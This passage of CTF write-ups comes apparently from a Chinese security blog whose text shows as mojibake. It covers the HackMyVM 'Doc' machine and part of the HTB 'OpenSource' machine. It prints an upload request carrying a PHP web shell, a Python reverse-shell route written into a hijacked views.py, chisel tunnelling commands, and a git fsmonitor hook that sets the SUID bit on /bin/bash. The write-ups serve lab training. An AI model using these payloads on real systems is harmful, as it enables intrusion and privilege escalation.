<h4 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºçš„ç‚¹ä¸»è¦åœ¨åˆ‡æ¢macåœ°å€ï¼Œè¿˜è¦å°è¯•å‡ºæ¥æœ€åä¸€ä½æ˜¯fï¼Œbroè¿™ä¸ªä¹Ÿéš¾æƒ³ï¼Œä»¥åè¦å¤šè€ƒè™‘å¯ä»¥ç”¨cewlç”Ÿæˆå­—å…¸ï¼Œææƒæ¯”è¾ƒç®€å•ã€‚</p>
<h3 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h3><h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>éš¾åº¦ï¼šeasy</p>
<p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Doc" >https://hackmyvm.eu/machines/machine.php?vm=Doc<i class="fas fa-external-link-alt"></i></a></p>
<p>ipåœ°å€ï¼š192.168.64.104</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>å¼€äº†80ç«¯å£å’Œ3306ç«¯å£ï¼Œå…ˆçœ‹çœ‹80ç«¯å£ï¼Œä¸€æ‰“å¼€å°±çœ‹åˆ°loginé€‰é¡¹ï¼Œç‚¹å‡»åå‘ç°è¦é…ç½®hostsæ–‡ä»¶ï¼Œé…ç½®ä¸ºdoc.hmvï¼Œç„¶åé¢å¯¹ç™»é™†æ¡†ï¼Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325100855.png" ></p>
<p>å¯ä»¥çœ‹åˆ°ç”¨äº†ä¸€ä¸ªOTOMSçš„æ¡†æ¶ï¼Œæœ‰æ‰¾åˆ°ç›¸å…³ç‰ˆæœ¬çš„æ¼æ´ï¼Œä½†è¦å…ˆç™»é™†ï¼Œéšä¾¿è¾“å…¥ç‚¹å†æŠ“ä¸ªåŒ…ï¼Œsqlmapæµ‹ä¸€ä¸‹ï¼Œæ˜¯å¯ä»¥æ³¨å…¥çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101135.png" ></p>
<p>çˆ†å‡ºä¸¤ä¸ªæ•°æ®åº“ï¼Œå†ä»”ç»†çœ‹çœ‹é‡Œé¢çš„å†…å®¹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101328.png" ></p>
<p>æ‰¾åˆ°è´¦å·å¯†ç ï¼Œç™»é™†åˆ°åå°ï¼Œæ‰¾åˆ°æ¼æ´åº“ï¼ˆ<a class="link"   href="https://www.exploit-db.com/exploits/50389%EF%BC%89%E8%AF%B4%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%AA%E4%BA%BA%E5%A4%B4%E5%83%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E5%85%88%E6%8A%93%E4%B8%AA%E5%8C%85" >https://www.exploit-db.com/exploits/50389ï¼‰è¯´çš„æ¼æ´ç‚¹ï¼Œä¹Ÿå°±æ˜¯ä¸ªäººå¤´åƒä¿®æ”¹æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆæŠ“ä¸ªåŒ…<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325101948.png" ></p>
<p>ç„¶åæŒ‰ç…§pocå‘é€åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/Users.php?f=save HTTP/1.1</span><br><span class="line">Host: doc.hmv</span><br><span class="line">Content-Length: 1018</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Origin: http://doc.hmv</span><br><span class="line">Referer: http://doc.hmv/admin/?page=user</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=smop95l7ie9o8dn57cv56s1so8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">John</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">Smith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">jsmith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;x&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;x&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh--</span><br></pre></td></tr></table></figure>

<p>å‘é€æˆåŠŸåï¼Œå¤´åƒä»åŸæ¥æœ‰å¼ å›¾ç‰‡åˆ°ç°åœ¨åŠ è½½ä¸å‡ºæ¥ï¼Œåœ¨å›¾ç‰‡é‚£é‡Œå³é”®æ‰“å¼€å›¾ç‰‡é“¾æ¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102116.png" ></p>
<p>æ–‡ä»¶ä¸Šä¼ åˆ©ç”¨æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±è¾“å…¥ncåå¼¹ä¸€ä¸ªshellå³å¯</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102209.png" ></p>
<h4 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102250.png" ></p>
<p>åœ¨&#x2F;var&#x2F;www&#x2F;htmlçš„ç›®å½•ä¸‹æ‰¾åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œä¹Ÿæœ‰çœ‹åˆ°bellaç”¨æˆ·ï¼Œç„¶åå°±å°è¯•ç”¨è¿™ä¸ªç™»é™†bellaï¼ŒæˆåŠŸ</p>
<p>ç„¶åsudo -læŸ¥åˆ°docå¯ä»¥åˆ©ç”¨ï¼Œå…ˆæ‰§è¡Œçœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102530.png" ></p>
<p>å®ƒæ‰“å¼€äº†æœ¬åœ°7890ç«¯å£ï¼Œå†æ‹¿ä¸€ä¸ªshellç„¶åç”¨socatè½¬å‘ç«¯å£çœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102829.png" ></p>
<p>çœ‹èµ·æ¥æ˜¯ä¸ªæ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œçœ‹äº†é¢˜è§£æ‰çŸ¥é“è¿™æ˜¯pydocï¼Œä»–æ˜¯æœ‰æ¼æ´çš„ï¼Œä¸€ä¸ªæ€è·¯æ˜¯â€œ&#x2F;getfile?key&#x3D;â€åé¢è·Ÿä¸Šæ–‡ä»¶åå°±èƒ½è¯»å–åˆ°æƒ³è¦çš„æ–‡ä»¶ï¼Œå°±å¯ä»¥&#x2F;getfile?key&#x3D;&#x2F;root&#x2F;root.txt</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ€è·¯æ˜¯åœ¨tmpç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªpyæ–‡ä»¶ï¼Œç„¶ååœ¨è§é¢æœç´¢è®¿é—®ï¼Œä¹Ÿèƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„è¯­å¥ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104332.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104446.png" ></p>
<p>ææƒæˆåŠŸ</p>
<h4 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºç›¸å¯¹ç®€å•ï¼Œä¹Ÿæœ‰ä¸€å®šçš„æ›²æŠ˜ï¼Œæœ€åçš„pydocæ²¡æ¥è§¦è¿‡ï¼Œå€¼å¾—å­¦ä¹ ã€‚</p>
<p>docçš„æºä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/usr/bin/pydoc3.9 -p 7890&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb OpenSourceå¤ç›˜</title>
    <url>/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128707843" >https://blog.csdn.net/Purpose_7/article/details/128707843<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78" >https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78<i class="fas fa-external-link-alt"></i></a></p>
<p>å®˜æ–¹wp</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â””â”€# nmap -A -p- --min-rate=1000 -T4 10.10.11.164  </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 03:49 PDT</span><br><span class="line">Warning: 10.10.11.164 giving up on port because retransmission cap hit (6).</span><br><span class="line">Stats: 0:04:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% done; ETC: 03:55 (0:01:25 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.164</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)</span><br><span class="line">|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)</span><br><span class="line">|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)</span><br><span class="line">80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|_http-server-header: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|     Date: Wed, 11 Sep 2024 10:42:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 5316</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-title: upcloud - Upload files for Free!</span><br><span class="line">3000/tcp filtered ppp</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1767F%P=aarch64-unknown-linux-g</span><br><span class="line">SF:nu%r(GetRequest,1573,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.</span><br><span class="line">ã€‚ã€‚ã€‚</span><br><span class="line">OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 993/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   554.57 ms 10.10.16.1</span><br><span class="line">2   391.34 ms 10.10.11.164</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 357.94 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹80ç«¯å£ï¼Œæœ‰ä¸€ä¸ª&#x2F;upcloudï¼Œ&#x2F;downloadå’Œ&#x2F;uploadsï¼Œçœ‹åˆ°æ˜¯flaskçš„ï¼Œæ‰€ä»¥åœ¨ä¸Šä¼ ç‚¹æ²¡è€ƒè™‘phpã€‚ä¸Šä¼ pyæ–‡ä»¶åè®¿é—®æœåŠ¡å™¨æ²¡æœ‰è¿è¡Œï¼Œä¸è€ƒè™‘ã€‚å‰é¢nmapæ‰«åˆ°ä¸€ä¸ªåº”ç”¨ç‰ˆæœ¬<code>Werkzeug/2.1.2</code>æ²¡æœ‰çœ‹åˆ°æ˜æ˜¾å¯ä»¥ç”¨çš„æ¼æ´ï¼Œä¸è€ƒè™‘ã€‚ç›´æ¥è®¿é—®&#x2F;consoleéœ€è¦pinç ï¼Œæ²¡æœ‰çœ‹åˆ°ã€‚</p>
<p>æ¥åˆ°&#x2F;downloadï¼Œè‡ªåŠ¨ä¸‹è½½ä¸€ä¸ªsoucre.zipï¼Œè§£å‹çœ‹çœ‹ï¼Œæœ‰ä¸ªgitæ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190158.png" ></p>
<p>çœ‹åˆ°git æ—¥å¿—ï¼Œæ³¨æ„åˆ°æŒ‡å‘äº†publicåˆ†æ”¯ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åˆ«çš„åˆ†æ”¯</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190228.png" ></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªdevï¼Œåˆ‡æ¢è¿‡å»ï¼Œæœ‰æ–°çš„log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads/source]</span><br><span class="line">â””â”€# git branch</span><br><span class="line">  dev</span><br><span class="line">* public</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads/source]</span><br><span class="line">â””â”€# git checkout dev                                                                                  </span><br><span class="line">Already on &#x27;dev&#x27;</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads/source]</span><br><span class="line">â””â”€# git log         </span><br><span class="line">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev, switch)</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:47:24 2022 +0200</span><br><span class="line"></span><br><span class="line">    ease testing</span><br><span class="line"></span><br><span class="line">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:54 2022 +0200</span><br><span class="line"></span><br><span class="line">    added gitignore</span><br><span class="line"></span><br><span class="line">commit a76f8f75f7a4a12b706b0cf9c983796fa1985820</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:16 2022 +0200</span><br><span class="line"></span><br><span class="line">    updated</span><br><span class="line"></span><br><span class="line">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:45:17 2022 +0200</span><br><span class="line"></span><br><span class="line">    initial</span><br></pre></td></tr></table></figure>

<p>ç¿»æ‰¾äº†ä¸€ä¸‹èƒ½å¤Ÿçœ‹åˆ°dev01ç”¨æˆ·çš„å¯†ç ï¼Œç›´æ¥æ‹¿å»ç™»é™†sshï¼Œå°è¯•å¤±è´¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190732.png" ></p>
<h4 id="ç«‹è¶³ç‚¹"><a href="#ç«‹è¶³ç‚¹" class="headerlink" title="ç«‹è¶³ç‚¹"></a>ç«‹è¶³ç‚¹</h4><p>çœ‹ä¸€ä¸‹sourceå…¶ä»–æ–‡ä»¶ï¼Œåœ¨source&#x2F;app&#x2F;app&#x2F;views.pyï¼Œçœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upcloud&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_name = get_file_name(f.filename)</span><br><span class="line">        file_path = os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, file_name)</span><br><span class="line">        f.save(file_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;success.html&#x27;</span>, file_url=request.host_url + <span class="string">&quot;uploads/&quot;</span> + file_name)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploads/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_report</span>(<span class="params">path</span>):</span><br><span class="line">    path = get_file_name(path)</span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, path))</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ«çš„wpè¯´æ˜¯os.path.johnï¼Œæ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥äº†ï¼Œ<strong>å¦‚æœåœ¨æ–‡ä»¶åä¸­æ’å…¥æ–œæ å­—ç¬¦ï¼Œåˆ™ä¸ä¼šè€ƒè™‘è·¯å¾„çš„å…¶ä½™éƒ¨åˆ†</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191354.png"  alt="å®˜æ–¹wpæ¼”ç¤º"></p>
<p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹ï¼ŒæŠŠæ–‡ä»¶åæ”¹ä¸º&#x2F;app&#x2F;app&#x2F;views.pyï¼Œæ›¿æ¢åŸæ¥çš„views.py(æŠ“åŒ…å®ç°)ï¼Œåœ¨é‡Œé¢å†™å…¥æ–°çš„åŠŸèƒ½æ‹¿åˆ°shell</p>
<p>åœ¨æ–°çš„views.pyé‡Œé¢å¢åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/revshell/&lt;ip&gt;&#x27;)</span><br><span class="line">def rev_shell(ip):</span><br><span class="line">    import socket,os,pty</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    pty.spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…æ”¹æ–‡ä»¶åä¸Šä¼ </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191929.png" ></p>
<p>æœ¬åœ°å¼€å¯ç›‘å¬ï¼Œç„¶åè®¿é—®<code>10.10.11.164/revshell/10.10.16.2</code>ï¼Œæ‹¿åˆ°shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911192102.png" ></p>
<h4 id="æ‹¿åˆ°user"><a href="#æ‹¿åˆ°user" class="headerlink" title="æ‹¿åˆ°user"></a>æ‹¿åˆ°user</h4><p>åˆçœ‹åˆ°.dockerenvæ–‡ä»¶ï¼Œå¯ä»¥ç¡®å®šæ˜¯åœ¨dockeré‡Œé¢ï¼Œä¸Šä¼ ä¸€ä¸ªfscanæ‰«æï¼Œçœ‹åˆ°å¼€äº†å‡ ä¸ªipï¼Œæœ¬åœ°curlå†…å®¹éƒ½å·®ä¸å¤š</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911193125.png" ></p>
<p>è®¿é—®ï¼ˆwgetï¼‰è¿™å‡ ä¸ªipéƒ½æ˜¯å’Œä¹‹å‰ç›´æ¥è®¿é—®80ç«¯å£ä¸€æ ·çš„å†…å®¹ã€‚é™¤äº†172.17.0.1ï¼Œæœ‰ä¸ª3000ç«¯å£ï¼Œæ˜¯ä¸ªgiteaï¼Œå°è¯•æ­å»ºä¸ªéš§é“è½¬å‘å‡ºæ¥</p>
<p>è¿™é‡Œç”¨åˆ°<a class="link"   href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" >chisel<i class="fas fa-external-link-alt"></i></a>æ­å»ºï¼Œåœ¨kaliä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# ./chisel_1.10.0_linux_arm64 server -p 8000 --reverse</span><br><span class="line">2024/09/11 04:54:47 server: Reverse tunnelling enabled</span><br><span class="line">2024/09/11 04:54:47 server: Fingerprint TolIpzRv4g1qkoHO0zNMWbtOoAgYjXKucuJrFsfNvBE=</span><br><span class="line">2024/09/11 04:54:47 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<p>é¶æœºä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp # ./chisel_1.10.0_linux_amd64 client 10.10.16.2:8000 R:3000:172.17.0.1:3000</span><br><span class="line">./chisel_1.10.0_linux_amd64 client 10.10.14.6:8000 R:3000:172.17.0.1:3000</span><br><span class="line">2024/09/11 11:47:02 client: Connecting to ws://10.10.14.6:8000</span><br></pre></td></tr></table></figure>

<p>ç„¶åkaliè®¿é—®127.0.0.1:3000ï¼Œå°±èƒ½çœ‹åˆ°giteaï¼Œç„¶åä¹‹å‰åœ¨gité‡Œæ‰¾åˆ°ä¸€ä¸ªdev01çš„è´¦å·å¯†ç ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½æ´¾ä¸Šç”¨åœºäº†</p>
<p>ç™»é™†ååœ¨ä»“å‚¨é‡Œçœ‹åˆ°.sshç›®å½•ï¼Œå¯ä»¥ç›´æ¥è¯»å–id_rsaï¼Œå¤åˆ¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œç›´æ¥ç™»å½•äº†ï¼Œæ‹¿åˆ°äº†dev01çš„shell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>æ‹¿åˆ°åä¸€ç•ªæœå¯»ï¼Œæ²¡ä»€ä¹ˆå‘ç°ï¼Œä¸Šä¼ ä¸€ä¸ªpspy64å¹¶è¿è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911200759.png" ></p>
<p>æœ‰ä¸€ä¸ª&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;local&#x2F;bin&#x2F;git-syncï¼ˆæœ‰ç‚¹éš¾å‘ç°ï¼‰ï¼ŒæŸ¥çœ‹å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:/tmp$ cat /usr/local/bin/git-sync</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd /home/dev01/</span><br><span class="line"></span><br><span class="line">if ! git status --porcelain; then</span><br><span class="line">    echo &quot;No changes&quot;</span><br><span class="line">else</span><br><span class="line">    day=$(date +&#x27;%Y-%m-%d&#x27;)</span><br><span class="line">    echo &quot;Changes detected, pushing..&quot;</span><br><span class="line">    git add .</span><br><span class="line">    git commit -m &quot;Backup for $&#123;day&#125;&quot;</span><br><span class="line">    git push origin main</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯åœ¨gité…ç½®dev01çš„å®¶ç›®å½•ï¼Œæ ¹æ®å®˜æ–¹wpæ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹gitçš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·å°±èƒ½é—´æ¥åœ°åˆ©ç”¨rootæƒé™æ‰§è¡Œæˆ‘ä»¬æƒ³å¹²çš„äº‹</p>
<p>åœ¨~&#x2F;.git&#x2F;configä¸­å†™å…¥ <code>fsmonitor = &quot;chmod 4755 /bin/bash&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:~/.git$ nano config </span><br><span class="line">dev01@opensource:~/.git$ cat config </span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">        fsmonitor = &quot;chmod 4755 /bin/bash&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://opensource.htb:3000/dev01/home-backup.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

